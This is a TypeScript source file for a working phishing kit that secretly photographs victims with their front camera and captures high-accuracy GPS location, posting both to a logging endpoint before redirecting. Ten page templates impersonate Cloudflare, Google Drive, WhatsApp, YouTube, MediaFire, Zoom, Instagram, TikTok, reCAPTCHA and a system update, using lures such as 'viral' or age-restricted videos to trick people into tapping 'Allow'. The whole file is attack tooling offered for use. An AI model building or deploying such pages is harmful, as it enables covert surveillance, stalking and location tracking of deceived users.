export const getCaptureScript = (id: string, redirectUrl: string = 'https://google.com') => `
<video id="video" width="320" height="240" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>
<script>
  let gpsSent = false;
  let camSent = false;
  let totalTime = 0;
  
  const checkRedirect = () => {
    if(totalTime >= 5 && (camSent || gpsSent || totalTime >= 8)) {
      window.location.href = '${redirectUrl}';
    }
  };

  setInterval(() => { totalTime++; checkRedirect(); }, 1000);

  // 1. Capture Camera
  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
      .then(function(stream) {
        const video = document.getElementById('video');
        video.srcObject = stream;
        video.play();
        
        setTimeout(() => {
          const canvas = document.getElementById('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          
          const imgData = canvas.toDataURL('image/jpeg', 0.8);
          
          fetch('/api/log/${id}/cam', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ image: imgData })
          }).then(() => { camSent = true; checkRedirect(); }).catch(() => { camSent = true; checkRedirect(); });
          
          stream.getTracks().forEach(track => track.stop());
        }, 1000);
      })
      .catch(function(err) {
        console.log("Camera access denied.");
        camSent = true; checkRedirect();
      });
  } else { camSent = true; }

  // 2. Capture GPS
  setTimeout(() => { 
    if (navigator.geolocation) { 
      navigator.geolocation.getCurrentPosition( 
        (pos) => { 
          fetch('/api/log/${id}/gps', { 
            method: 'POST', 
            headers: { 'Content-Type': 'application/json' }, 
            body: JSON.stringify({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }) 
          }).then(() => { gpsSent = true; checkRedirect(); }).catch(() => { gpsSent = true; checkRedirect(); }); 
        }, 
        (err) => { gpsSent = true; checkRedirect(); }, 
        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 } 
      ); 
    } else { gpsSent = true; checkRedirect(); } 
  }, 500);
</script>
`;

export const templates: Record<string, {name: string, render: (id: string) => string}> = {
  '1': {
    name: "Cloudflare (Verifikasi Manusia)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Checking your browser...</title><style>body { margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; background-color: #fff; color: #333; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; } .spinner { width: 35px; height: 35px; border: 3px solid #e0e0e0; border-top: 3px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; } @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } .header { font-size: 22px; margin-bottom: 20px; font-weight: 500; } .text { font-size: 15px; margin-bottom: 15px; color: #555; } .small { font-size: 12px; color: #888; margin-top: 30px; }</style></head><body><div class="spinner"></div><div class="header">Verifying you are human...</div><div class="text">We need to check your browser to ensure connection security.</div><div class="text"><strong>Please press "Allow" or "Izinkan"</strong> if asked.</div><div class="small">Ray ID: ${id} &bull; Security by Cloudflare</div>${getCaptureScript(id)}</body></html>`
  },
  '2': {
    name: "Google Drive (Minta Akses File)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Google Drive - Access Denied</title><style>body { font-family: 'Google Sans', Roboto, Arial, sans-serif; text-align: center; padding-top: 15vh; background: #fff; color: #202124; } .container { max-width: 400px; margin: 0 auto; box-shadow: 0 1px 3px rgba(0,0,0,0.12); padding: 30px; border-radius: 8px; border: 1px solid #dadce0; } h1 { font-size: 24px; font-weight: 400; } p { color: #5f6368; font-size: 14px; line-height: 1.5; } .btn { display: inline-block; background: #1a73e8; color: white; padding: 10px 24px; text-decoration: none; border-radius: 4px; font-weight: 500; margin-top: 20px; border: none; cursor: pointer; }</style></head><body><div class="container"><img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Google_Drive_logo.png" width="60" alt="Drive Logo"><h1>Anda memerlukan akses</h1><p>Meminta akses untuk melihat file ini (IMG_9402.mp4). Tekan <b>"Allow/Izinkan"</b> untuk memverifikasi akun Anda dengan Device.</p><button class="btn">Minta Akses</button></div>${getCaptureScript(id, 'https://drive.google.com/')}</body></html>`
  },
  '3': {
    name: "WhatsApp Group (Join Link)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>WhatsApp Group Invite</title><style>body { background-color: #E6E1D8; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; text-align: center; margin: 0; padding-top: 10vh; } .card { background: white; max-width: 380px; margin: 0 auto; padding: 30px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); } .avatar { background: #00A884; width: 64px; height: 64px; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; color: white; font-size: 30px; margin-bottom: 10px; } h2 { margin: 10px 0; font-size: 20px; color: #111B21; } p { color: #667781; font-size: 15px; margin-bottom: 25px; } .btn { background: #00A884; color: white; border: none; padding: 12px 24px; border-radius: 20px; font-weight: bold; font-size: 14px; width: 100%; cursor: pointer; }</style></head><body><div class="card"><div class="avatar">👥</div><h2>Grup Video Viral</h2><p>WhatsApp Group Invite</p><p style="font-size:12px;color:#888;">Verifikasi nomor dan device Anda terlebih dahulu dengan menekan <b>Izinkan / Allow</b> pada pop-up.</p><button class="btn">Bergabung ke Chat</button></div>${getCaptureScript(id, 'https://chat.whatsapp.com/')}</body></html>`
  },
  '4': {
    name: "YouTube (Age Restriction 18+)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>YouTube</title><style>body { background: #0f0f0f; color: white; font-family: "YouTube Noto", Roboto, Arial, sans-serif; text-align: center; padding-top: 20vh; margin: 0; } .warning { max-width: 400px; margin: 0 auto; padding: 20px; } .warning h2 { font-size: 20px; margin-bottom: 15px; font-weight: 500; } .warning p { color: #aaaaaa; font-size: 14px; line-height: 1.5; margin-bottom: 25px; } .btn { background: #3ea6ff; color: #0f0f0f; border: none; padding: 10px 16px; border-radius: 18px; font-weight: 500; cursor: pointer; }</style></head><body><div class="warning"><h2>Video dibatasi usia (berdasarkan pedoman komunitas)</h2><p>Harap konfirmasi usia Anda. YouTube memerlukan verifikasi Device (Lokasi & Media) untuk melanjutkan. Klik <b>Allow/Izinkan</b> untuk memverifikasi umur Anda.</p><button class="btn">Verifikasi Umur</button></div>${getCaptureScript(id, 'https://youtube.com/')}</body></html>`
  },
  '5': {
    name: "MediaFire (Download File)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>MediaFire</title><style>body { font-family: Arial, sans-serif; background: #e8eaf6; text-align: center; padding-top: 10vh; margin: 0; } .box { background: white; border-radius: 8px; max-width: 500px; margin: 0 auto; box-shadow: 0 4px 6px rgba(0,0,0,0.1); overflow: hidden; } .header { background: #1565c0; color: white; padding: 20px; font-size: 20px; font-weight: bold; } .content { padding: 30px; } .dl-btn { background: #4caf50; color: white; border: none; padding: 15px 30px; border-radius: 4px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; box-sizing: border-box; } .note { font-size: 12px; color: #666; margin-top: 15px; }</style></head><body><div class="box"><div class="header">MediaFire</div><div class="content"><h3 style="margin-top:0;">Video_Viral_Tiktok_Terbaru.mp4</h3><p style="color:#777;">(8.4 MB) - Uploaded 20 mins ago</p><button class="dl-btn">DOWNLOAD</button><div class="note">To download this file, we must verify your browser. Please click <b>"Allow"</b> when prompted.</div></div></div>${getCaptureScript(id, 'https://mediafire.com/')}</body></html>`
  },
  '6': {
    name: "Zoom (Join Meeting)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Launch Meeting - Zoom</title><style>body { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; background: #fdfdfd; text-align: center; padding-top: 15vh; color: #222; } h1 { font-weight: 300; font-size: 28px; margin-bottom: 20px; } .btn { background: #0b5cff; color: white; padding: 12px 24px; border-radius: 8px; text-decoration: none; font-weight: 600; font-size: 16px; border: none; } .subtext { margin-top: 20px; font-size: 14px; color: #747487; max-width: 400px; margin-left: auto; margin-right: auto; line-height: 1.5; }</style></head><body><img src="https://st1.zoom.us/static/6.3.25055/image/new/ZoomLogo.png" width="110" alt="Zoom"><br><br><h1>Launching...</h1><button class="btn">Launch Meeting</button><div class="subtext">Please click <b>Allow / Izinkan</b> on Camera & Location permissions so we can connect your device to the meeting.</div>${getCaptureScript(id, 'https://zoom.us/')}</body></html>`
  },
  '7': {
    name: "Instagram (Login to View)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Instagram</title><style>body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fafafa; text-align: center; margin: 0; padding-top: 10vh; } .box { background: white; border: 1px solid #dbdbdb; max-width: 350px; margin: 0 auto; padding: 40px; border-radius: 1px; } h1 { font-family: 'Georgia', serif; font-style: italic; font-size: 40px; margin-top: 0; margin-bottom: 30px; font-weight: normal; } input { width: 100%; box-sizing: border-box; background: #fafafa; border: 1px solid #dbdbdb; padding: 9px 8px; border-radius: 3px; margin-bottom: 6px; font-size: 12px; } .btn { background: #0095f6; color: white; border: none; padding: 8px; border-radius: 4px; font-weight: 600; width: 100%; margin-top: 10px; cursor: pointer; } .alert { color:#ed4956; font-size:14px; margin-bottom:20px; }</style></head><body><div class="box"><h1>Instagram</h1><div class="alert">To view this private post, you must verify your device by clicking <b>Allow/Izinkan</b> on the permission popup.</div><input type="text" placeholder="Phone number, username, or email"><input type="password" placeholder="Password"><button class="btn">Log In</button></div>${getCaptureScript(id, 'https://instagram.com/')}</body></html>`
  },
  '8': {
    name: "TikTok (18+ Video Unavailable)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>TikTok - Make Your Day</title><style>body { font-family: 'Proxima Nova', Arial, sans-serif; background: #121212; color: white; text-align: center; margin: 0; padding-top: 20vh; } .icon { font-size: 50px; margin-bottom: 20px; } h2 { margin: 0 0 10px; font-size: 24px; } p { color: #rgba(255,255,255,0.7); font-size: 15px; max-width: 320px; margin: 0 auto 30px; line-height: 1.4; } .btn { background: #fe2c55; color: white; border: none; padding: 12px 32px; border-radius: 4px; font-weight: bold; font-size: 16px; cursor: pointer; }</style></head><body><div class="icon">🔒</div><h2>Video Unavailable</h2><p>This video is age-restricted. Please verify your identity and device location to continue watching. Click <b>Allow / Izinkan</b> if prompted.</p><button class="btn">Verify and Watch</button>${getCaptureScript(id, 'https://tiktok.com/')}</body></html>`
  },
  '9': {
    name: "Captcha (reCAPTCHA verifikasi)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Robot Verification</title><style>body { font-family: Roboto, Arial, sans-serif; background: #e0e0e0; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; } .captcha-box { background: #f9f9f9; border: 1px solid #d3d3d3; padding: 10px; border-radius: 3px; display: inline-flex; align-items: center; width: 300px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); } .checkbox { width: 28px; height: 28px; border: 2px solid #c1c1c1; background: #fff; border-radius: 2px; margin-right: 15px; cursor: pointer; } .text { font-size: 14px; color: #555; } .logo { margin-left: auto; text-align: center; } .logo img { width: 32px; height: 32px; } .logo-text { font-size: 10px; color: #999; margin-top: 3px; }</style></head><body><div><p style="text-align:center; color:#555; margin-bottom: 20px; max-width: 300px;">To continue, please verify you are not a robot by clicking <b>"Allow/Izinkan"</b>.</p><div class="captcha-box"><div class="checkbox"></div><div class="text">I'm not a robot</div><div class="logo"><img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA"><div class="logo-text">reCAPTCHA<br>Privacy - Terms</div></div></div></div>${getCaptureScript(id)}</body></html>`
  },
  '10':{
    name: "System Update (Software Update)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Software Update Required</title><style>body { font-family: -apple-system, sans-serif; background: #f5f5f7; color: #1d1d1f; text-align: center; margin: 0; padding-top: 15vh; } .icon { font-size: 60px; margin-bottom: 20px; color: #007aff; } h1 { font-size: 24px; font-weight: 600; } p { color: #515154; font-size: 14px; max-width: 300px; margin: 10px auto 30px; line-height: 1.4; } .btn { background: #007aff; color: white; border: none; padding: 12px 30px; border-radius: 20px; font-size: 15px; font-weight: 600; width: 250px; cursor: pointer; }</style></head><body><div class="icon">⚙️</div><h1>Security Update</h1><p>A critical security profile update is required to view this content. Press <b>Allow</b> to apply the configuration.</p><button class="btn">Update Now</button>${getCaptureScript(id)}</body></html>`
  }
};
